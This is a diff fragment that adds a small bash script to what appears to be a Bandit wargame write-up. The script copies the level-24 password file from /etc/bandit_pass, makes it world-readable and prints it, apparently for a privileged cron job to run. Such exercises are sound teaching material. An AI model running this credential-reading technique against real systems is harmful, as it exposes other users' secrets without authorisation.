@@ -394,4 +394,12 @@ do
 ```sh
 #!/bin/bash
 
+tmp="/tmp/tmp.QoI9PoOmYr"
+
+cd "$tmp"
+echo "cd into $tmp"
+
+cp /etc/bandit_pass/bandit24 .
+chmod 666 bandit24
+cat bandit24
 ```
